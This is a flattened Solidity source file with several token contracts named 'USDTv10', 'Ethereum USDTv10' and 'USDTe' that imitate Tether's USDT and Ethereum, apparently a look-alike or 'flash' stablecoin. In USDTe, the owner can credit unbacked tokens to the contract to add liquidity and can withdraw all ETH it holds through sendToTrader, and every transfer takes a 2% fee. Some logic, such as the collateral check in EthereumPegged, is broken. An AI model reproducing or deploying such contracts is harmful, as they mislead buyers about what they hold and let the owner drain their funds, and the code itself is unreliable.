// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;


/*
    Rafael Baena Alvarez  
    Founder  
    FFOLLOWME OÜ (16785919)  
    Harju maakond, Tallinn, Lasnamäe linnaosa, Lõõtsa tn 5 // Sepapaja tn 4, 11415  
    Tallinn (Estonia)  
    LinkedIn: https://www.linkedin.com/in/rafael-baena-828b06181/  
    Email: info@ffollowme.com  
    GitHub: https://github.com/followme-dot  
*/





// File: contracts/ReentrancyGuard.sol


pragma solidity ^0.8.20;

abstract contract ReentrancyGuard {
    enum ReentrancyStatus { NOT_ENTERED, ENTERED }
    ReentrancyStatus private _status;
    
    constructor() {
        _status = ReentrancyStatus.NOT_ENTERED;
    }
    
    modifier nonReentrant() {
        require(_status == ReentrancyStatus.NOT_ENTERED, "ReentrancyGuard: reentrant call");
        _status = ReentrancyStatus.ENTERED;
        _;
        _status = ReentrancyStatus.NOT_ENTERED;
    }
    
    modifier nonReentrantRead() {
        require(_status == ReentrancyStatus.NOT_ENTERED, "ReentrancyGuard: reentrant read");
        _;
    }
}

// File: contracts/Ownable.sol


pragma solidity ^0.8.20;


abstract contract Ownable {
    address private _owner;
    address private _pendingOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event OwnershipRenounced(address indexed previousOwner);

    constructor() {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is zero address");
        _pendingOwner = newOwner;
    }

    function acceptOwnership() public {
        require(msg.sender == _pendingOwner, "Ownable: not pending owner");
        emit OwnershipTransferred(_owner, _pendingOwner);
        _owner = _pendingOwner;
        _pendingOwner = address(0);
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipRenounced(_owner);
        _owner = address(0);
    }
}

// File: contracts/ERC20.sol


pragma solidity ^0.8.20;


contract ERC20 is Ownable ,ReentrancyGuard  {
    string public name;
    string public symbol;
    uint8 public decimals = 6;
    uint256 private _totalSupply = 100_000_000 * 10**6;
    uint256 public constant MAX_SUPPLY = 100_000_000 * 10**6;
        
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        require(_allowances[sender][msg.sender] >= amount, "ERC20: transfer amount exceeds allowance");
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(_balances[sender] >= amount, "ERC20: transfer amount exceeds balance");

        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");
        require(_totalSupply + amount <= MAX_SUPPLY, "ERC20: exceeds max supply");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");
        require(_balances[account] >= amount, "ERC20: burn amount exceeds balance");

        _balances[account] -= amount;
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount);
    }
}

// File: contracts/ERC20Burnable.sol


pragma solidity ^0.8.20;


contract ERC20Burnable is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}

    function burn(uint256 amount) public {
        _burn(msg.sender, amount);
    }

    function burnFrom(address account, uint256 amount) public {
        uint256 currentAllowance = allowance(account, msg.sender);
        require(currentAllowance >= amount, "ERC20Burnable: burn amount exceeds allowance");
        
        _approve(account, msg.sender, currentAllowance - amount);
        _burn(account, amount);
    }
}


// File: contracts/EIP712.sol


pragma solidity ^0.8.20;

contract EIP712 {
    string private _domainName;
    string private _version;

    bytes32 private constant _TYPEHASH = keccak256(
        "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"
    );

    constructor(string memory name_, string memory version_) {
        _domainName = name_;
        _version = version_;
    }

    function domainName() public view returns (string memory) {
        return _domainName;
    }

    function version() public view returns (string memory) {
        return _version;
    }

    function _domainSeparatorV4() internal view virtual returns (bytes32) {
        uint256 chainId;
        assembly {
            chainId := chainid()
        }

        return keccak256(
            abi.encode(
                _TYPEHASH,
                keccak256(bytes(_domainName)),
                keccak256(bytes(_version)),
                chainId,
                address(this)
            )
        );
    }

    function _hashTypedDataV4(bytes32 structHash) internal view virtual returns (bytes32) {
        return keccak256(
            abi.encodePacked(
                "\x19\x01",
                _domainSeparatorV4(),
                structHash
            )
        );
    }
}

// File: contracts/ERC20Permit.sol


pragma solidity ^0.8.20;



contract ERC20Permit is ERC20, EIP712 {
    constructor(string memory name, string memory symbol)
        ERC20(name, symbol)
        EIP712(name, "1") // Se hereda correctamente de EIP712
    {}

    function _domainSeparatorV4() internal view override returns (bytes32) {
        uint256 chainId;
        assembly {
            chainId := chainid()
        }

        return keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256(bytes(domainName())), // Se usa domainName() en lugar de name()
                keccak256(bytes(version())),
                chainId,
                address(this)
            )
        );
    }

    function _hashTypedDataV4(bytes32 structHash) internal view override returns (bytes32) {
        return keccak256(
            abi.encodePacked(
                "\x19\x01",
                _domainSeparatorV4(),
                structHash
            )
        );
    }
}

// File: contracts/SafeMath.sol


pragma solidity ^0.8.20;

library SafeMath {
    /**
     * @dev Devuelve la suma de dos números enteros sin desbordamiento.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    /**
     * @dev Devuelve la resta de dos números enteros sin subdesbordamiento.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    /**
     * @dev Devuelve la multiplicación de dos números enteros sin desbordamiento.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    /**
     * @dev Devuelve la división de dos números enteros sin dividir por cero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    /**
     * @dev Devuelve el residuo de la división de dos números enteros sin dividir por cero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: modulo by zero");
        return a % b;
    }
}

// File: contracts/IERC20Flash.sol


pragma solidity ^0.8.0;



interface IERC20Flash {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function mint(address account, uint256 amount) external returns (bool);
    function burn(address account, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Mint(address indexed account, uint256 amount);
    event Burn(address indexed account, uint256 amount);
}

contract IERC20FlashToken is IERC20Flash, Ownable {
    using SafeMath for uint256;

    string public name = "USDTv10";
    string public symbol = "USDTv10";
    uint8 public decimals = 6;
    uint256 public override totalSupply;
    uint256 public mintLimit;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    constructor(uint256 _initialSupply, uint256 _mintLimit) {
        totalSupply = _initialSupply;
        mintLimit = _mintLimit;
        _balances[msg.sender] = _initialSupply;
        emit Transfer(address(0), msg.sender, _initialSupply);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        require(_balances[msg.sender] >= amount, "Insufficient balance");
        _balances[msg.sender] = _balances[msg.sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        require(_balances[sender] >= amount, "Insufficient balance");
        require(_allowances[sender][msg.sender] >= amount, "Allowance exceeded");
        
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount);
        
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function mint(address account, uint256 amount) public override onlyOwner returns (bool) {
        require(totalSupply.add(amount) <= mintLimit, "Mint limit exceeded");
        require(account != address(0), "Invalid address");

        totalSupply = totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);

        emit Mint(account, amount);
        emit Transfer(address(0), account, amount);
        return true;
    }

    function burn(address account, uint256 amount) public override onlyOwner returns (bool) {
        require(account != address(0), "Invalid address");
        require(_balances[account] >= amount, "Insufficient balance");

        _balances[account] = _balances[account].sub(amount);
        totalSupply = totalSupply.sub(amount);

        emit Burn(account, amount);
        emit Transfer(account, address(0), amount);
        return true;
    }
}

// File: contracts/CollateralManager.sol


pragma solidity ^0.8.20;




contract CollateralManager is Ownable ,ReentrancyGuard  {
    IERC20Flash public collateralToken; // Token colateralizado (ej. USDT)
    address public priceOracle; // Oráculo de precios
    address public liquidityPool; // Pool de liquidez
    uint256 public minCollateralRatio; // Ratio mínimo de colateralización (ej. 150%)
    mapping(address => uint256) private collateralBalances;
    mapping(address => uint256) public collateralDeposits; // Registra el colateral de cada usuario
    
    event CollateralDeposited(address indexed user, uint256 amount);
    event CollateralWithdrawn(address indexed user, uint256 amount);
    event LiquidationExecuted(address indexed user, uint256 amount);
    event MinCollateralRatioUpdated(uint256 newRatio);
    event OracleUpdated(address newOracle);
    event LiquidityPoolUpdated(address newPool);
    
    constructor(address _collateralToken, address _priceOracle, address _liquidityPool, uint256 _minCollateralRatio) {
        collateralToken = IERC20Flash(_collateralToken);
        priceOracle = _priceOracle;
        liquidityPool = _liquidityPool;
        minCollateralRatio = _minCollateralRatio;
    }
    
    modifier onlyLiquidator() {
        require(msg.sender == owner() || msg.sender == liquidityPool, "Not authorized");
        _;
    }
        
    function getCollateralBalance() external view returns (uint256) {
        return collateralBalances[msg.sender];
    }
        
    function depositCollateral(uint256 amount) external {
        require(amount > 0, "Amount must be greater than 0");
        collateralToken.transferFrom(msg.sender, address(this), amount);
        collateralDeposits[msg.sender] += amount;
        emit CollateralDeposited(msg.sender, amount);
    }
    
    function withdrawCollateral(uint256 amount) external {
        require(amount > 0, "Amount must be greater than 0");
        require(collateralDeposits[msg.sender] >= amount, "Insufficient collateral");
        collateralDeposits[msg.sender] -= amount;
        collateralToken.transfer(msg.sender, amount);
        emit CollateralWithdrawn(msg.sender, amount);
    }
    
    function liquidate(address user, uint256 amount) external onlyLiquidator {
        require(collateralDeposits[user] >= amount, "Not enough collateral");
        collateralDeposits[user] -= amount;
        collateralToken.transfer(liquidityPool, amount);
        emit LiquidationExecuted(user, amount);
    }
    
    function updateMinCollateralRatio(uint256 newRatio) external onlyOwner {
        require(newRatio >= 100, "Ratio must be >= 100%");
        minCollateralRatio = newRatio;
        emit MinCollateralRatioUpdated(newRatio);
    }
    
    function updatePriceOracle(address newOracle) external onlyOwner {
        require(newOracle != address(0), "Invalid address");
        priceOracle = newOracle;
        emit OracleUpdated(newOracle);
    }
    
    function updateLiquidityPool(address newPool) external onlyOwner {
        require(newPool != address(0), "Invalid address");
        liquidityPool = newPool;
        emit LiquidityPoolUpdated(newPool);
    }
}

// File: contracts/IUniswapV2Router02.sol


pragma solidity ^0.8.20;

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);

    function swapExactTokensForETH(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}

// File: contracts/AggregatorV3Interface.sol


pragma solidity ^0.8.20;

interface AggregatorV3Interface {
    function decimals() external view returns (uint8);
    function description() external view returns (string memory);
    function version() external view returns (uint256);

    // Devuelve los datos de la última ronda de precios
    function latestRoundData()
        external
        view
        returns (
            uint80 roundId,
            int256 answer,
            uint256 startedAt,
            uint256 updatedAt,
            uint80 answeredInRound
        );

    function getRoundData(uint80 _roundId)
        external
        view
        returns (
            uint80 roundId,
            int256 answer,
            uint256 startedAt,
            uint256 updatedAt,
            uint80 answeredInRound
        );
}

// File: contracts/EthereumPegged.sol


pragma solidity ^0.8.20;







contract EthereumPegged is Ownable {
    using SafeMath for uint256;

    string public constant name = "Ethereum USDTv10";
    string public constant symbol = "ETHv10";
    uint8 public constant decimals = 6;
    uint256 public  _totalSupply = 100_000_000 * 10**6;
    uint256 public constant MAX_SUPPLY = 1_000_000_000 * 10**6; 
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    AggregatorV3Interface internal priceFeed;
    CollateralManager public collateralManager;
    IUniswapV2Router02 public uniswapRouter;

    uint256 public pegPrice = 1000000; // 1 USDT = 1 ETHv10 (6 decimales)
    uint256 public minCollateralRatio = 110;  // 110% colateral mínimo
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event PegAdjusted(uint256 newPegPrice);
    event Mint(address indexed to, uint256 amount);
    event Burn(address indexed from, uint256 amount);

    constructor(address _priceFeed, address _collateralManager, address _router) {
        require(_priceFeed != address(0), "Invalid oracle address");
        require(_collateralManager != address(0), "Invalid collateral manager");
        require(_router != address(0), "Invalid Uniswap router");

        priceFeed = AggregatorV3Interface(_priceFeed);
        collateralManager = CollateralManager(_collateralManager);
        uniswapRouter = IUniswapV2Router02(_router);
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        require(_balances[msg.sender] >= amount, "Insufficient balance");

        _balances[msg.sender] = _balances[msg.sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);

        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function mint(address to, uint256 amount) external onlyOwner {
        require(_checkCollateral(amount), "Insufficient collateral");

        _totalSupply = _totalSupply.add(amount);
        _balances[to] = _balances[to].add(amount);
        emit Mint(to, amount);
    }

    function burn(uint256 amount) external {
        require(_balances[msg.sender] >= amount, "Insufficient balance");

        _balances[msg.sender] = _balances[msg.sender].sub(amount);
        _totalSupply = _totalSupply.sub(amount);

        emit Burn(msg.sender, amount);
    }

    function getLatestPrice() public view returns (uint256) {
        (, int256 price, , , ) = priceFeed.latestRoundData();
        require(price > 0, "Invalid price data");
        return uint256(price);
    }

    function adjustPeg() external onlyOwner {
        uint256 marketPrice = getLatestPrice();
        if (marketPrice != pegPrice) {
            pegPrice = marketPrice;
            emit PegAdjusted(pegPrice);
        }
    }

    function _checkCollateral(uint256 amount) internal view returns (bool) {
        uint256 requiredCollateral = amount.mul(pegPrice).div(10**6).mul(minCollateralRatio).div(100);
        return collateralManager.getCollateralBalance() >= requiredCollateral;
    }
}

// File: contracts/USDTe.sol


pragma solidity ^0.8.20;


contract USDTe is Ownable ,ReentrancyGuard {
    using SafeMath for uint256;

    string public constant name = "Ethereum";
    string public constant symbol = "USDTe";
    uint8 public constant decimals = 6;
    uint256 private _totalSupply = 100_000_000 * 10**6;
    uint256 public constant MAX_SUPPLY = 100_000_000 * 10**6;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    IUniswapV2Router02 public uniswapRouter;
    CollateralManager public collateralManager;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event TokenSwapped(address indexed sender, uint256 tokenAmount, uint256 ethAmount);
    event TransactionFeePaid(address indexed from, uint256 amount);
    event Mint(address indexed to, uint256 amount);

    uint256 public transactionFee = 2; // 2% fee on each transfer
    address public feeRecipient;

    constructor(address _router, address _collateralManager, address _feeRecipient) {
        require(_router != address(0), "Invalid router address");
        require(_collateralManager != address(0), "Invalid collateral manager address");
        require(_feeRecipient != address(0), "Invalid fee recipient address");
        uniswapRouter = IUniswapV2Router02(_router);
        collateralManager = CollateralManager(_collateralManager);
        feeRecipient = _feeRecipient;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        uint256 fee = amount.mul(transactionFee).div(100);
        uint256 amountAfterFee = amount.sub(fee);

        require(_balances[msg.sender] >= amount, "Insufficient balance");
        _balances[msg.sender] = _balances[msg.sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amountAfterFee);
        _balances[feeRecipient] = _balances[feeRecipient].add(fee);  // Fee is sent to the feeRecipient

        emit Transfer(msg.sender, recipient, amountAfterFee);
        emit TransactionFeePaid(msg.sender, fee);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        uint256 fee = amount.mul(transactionFee).div(100);
        uint256 amountAfterFee = amount.sub(fee);

        require(_balances[sender] >= amount, "Insufficient balance");
        require(_allowances[sender][msg.sender] >= amount, "Allowance exceeded");
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amountAfterFee);
        _balances[feeRecipient] = _balances[feeRecipient].add(fee);  // Fee is sent to the feeRecipient
        _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount);

        emit Transfer(sender, recipient, amountAfterFee);
        emit TransactionFeePaid(sender, fee);
        return true;
    }

    function updateCollateralManager(address newManager) external onlyOwner {
        require(newManager != address(0), "Invalid address");
        collateralManager = CollateralManager(newManager);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) external onlyOwner {
        _balances[address(this)] = _balances[address(this)].add(tokenAmount);
        _approve(address(this), address(uniswapRouter), tokenAmount);

        uniswapRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Permite transferir tokens a múltiples direcciones en una sola transacción.
     * @param recipients Direcciones de los destinatarios.
     * @param amounts Cantidades de tokens a enviar a cada destinatario.
     */
    function multiTransfer(address[] memory recipients, uint256[] memory amounts) public {
        require(recipients.length == amounts.length, "Arrays length mismatch");
        
        uint256 totalAmount = 0;
        for (uint256 i = 0; i < amounts.length; i++) {
            totalAmount = totalAmount.add(amounts[i]);
        }

        require(_balances[msg.sender] >= totalAmount, "Insufficient balance for multi-transfer");

        for (uint256 i = 0; i < recipients.length; i++) {
            _balances[msg.sender] = _balances[msg.sender].sub(amounts[i]);
            _balances[recipients[i]] = _balances[recipients[i]].add(amounts[i]);
            emit Transfer(msg.sender, recipients[i], amounts[i]);
        }
    }
    
    // Función para emitir nuevos tokens
    function mint(address to, uint256 amount) external onlyOwner {
        require(_totalSupply.add(amount) <= MAX_SUPPLY, "Minting would exceed max supply");
        _mint(to, amount);
    }

    // Función interna de mint
    function _mint(address to, uint256 amount) internal {
        _totalSupply = _totalSupply.add(amount);
        _balances[to] = _balances[to].add(amount);
        emit Mint(to, amount);
        emit Transfer(address(0), to, amount);
    }

    

    /**
     * @dev Permite realizar operaciones de intercambio de tokens por ETH en Uniswap
     * @param tokenAmount Cantidad de tokens que se van a intercambiar por ETH.
     */
    function swapTokensForETH(uint256 tokenAmount) external onlyOwner {
        require(tokenAmount <= _balances[address(this)], "Insufficient balance in contract");

        _approve(address(this), address(uniswapRouter), tokenAmount);
        
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();

        uniswapRouter.swapExactTokensForETH(
            tokenAmount,
            0,  // Min amount of ETH to receive
            path,
            address(this),
            block.timestamp
        );

        uint256 ethAmount = address(this).balance;
        emit TokenSwapped(msg.sender, tokenAmount, ethAmount);
    }

    /**
     * @dev Permite enviar fondos a un trader para ejecutar operaciones de compra/venta
     * @param amount Cantidad de ETH a enviar al trader.
     */
    function sendToTrader(uint256 amount) external onlyOwner {
        require(address(this).balance >= amount, "Insufficient ETH balance in contract");
        payable(owner()).transfer(amount);
    }

    // Receive function to accept ETH for swapping
    receive() external payable {}
}